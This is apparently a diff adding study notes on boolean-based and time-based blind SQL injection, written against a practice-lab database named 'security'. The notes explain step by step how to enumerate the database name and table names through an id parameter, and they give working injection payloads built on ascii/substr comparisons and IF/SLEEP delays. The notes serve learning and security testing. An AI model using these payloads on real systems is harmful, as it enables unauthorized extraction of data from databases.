@@ -1,0 +1,47 @@
+Boolean Blind SQL Injection
+
+Scenario: In this type os SQL INJECTION, we observe some differences in the output on our screen when we tamper the id parameter
+
+Step 1: We need to assume and enumerate the logic of the backend query.
+
+Step 2: Once the query is analyzed and balanced with comments(--+), we start with our blind injection
+
+------------Building blocks------------------------
+
+select database();
+
+select length(database());
+
+select substr(database(),1,1); // the substr() function takes 3 arguments: [string, position of the string, length of string]
+i.e the above substr() function will execute database() function to give output at "security". the position is 1, so "s" of "security" will be selected and next 1 will select length. SO THE FINAL OUTPUT OF THE QUERY[select substr(database(),1,1)] will be "s"
+
+Since we dont have any error, we will ask questions in the injection query.
+
+' AND (ascii(substr(database(),1,1)) = 115)--+ //This query gives us a true response as the ascii equivalent for the letter "s" is 115
+
+' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 101)--+ //This query returns a true response as the 1st letter of the table name(emails) is "e"
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Time Based Blind SQL injection
+
+Scenario: In this type of sql injection, we dont observe any change in the output on our screen when we tamper the id parameter. 
+
+Step 1: We first assume the sql query logic at the backend and go for injection queries like ' AND SLEEP(10)--+
+
+Step 2: In time based blind sql injection we use the "if" function
+
+if(condition, output to be evaluated on true condition, output to be evaluated on false condition) // syntax for if() function in sql
+
+----------------Building blocks------------------------
+
+' AND if((select database()) = "security", sleep(10), null)--+
+
+' AND if(substr((select database()),1,1) = "s", sleep(10), null)--+
+
+' AND if(ascii(substr((select database()),1,1)) = 115, sleep(10), null)--+ // the injection query returns true as the ascii equivalent of 115 is "s" which is first letter of database name security
+
+' AND if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 101, sleep(10), null)--+ //the injection query returns true as the ascii equivalent of 101 is letter "e" which is the first letter of table name emails
